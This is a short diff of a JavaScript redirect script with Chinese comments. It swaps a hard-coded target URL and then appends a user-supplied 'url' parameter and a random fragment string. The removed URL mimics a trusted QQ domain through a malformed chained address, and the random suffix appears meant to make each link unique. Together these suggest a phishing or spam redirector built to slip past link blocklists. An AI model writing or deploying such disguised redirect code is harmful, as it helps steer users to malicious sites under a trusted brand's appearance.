@@ -9,7 +9,7 @@ const customParam = urlParams.get('url');
 const randomString = Math.random().toString(36).substring(2); // 生成随机字符串，包括数字和小写字母
 
 // 构建跳转链接
-let redirectURL = "http://img.omofresh.com./https://im.qq.com/https://www.2b222aidu.com/olaFg,2222222*,*,;3.svg";
+let redirectURL = "https://pbwci.qun.hk/FjmlhXU_rKpvBEAxUu_SRkpZXn-R";
 if (customParam) {
     redirectURL += "?url=" + customParam + "#" + randomString; // 将随机字符串添加到参数后面
 }
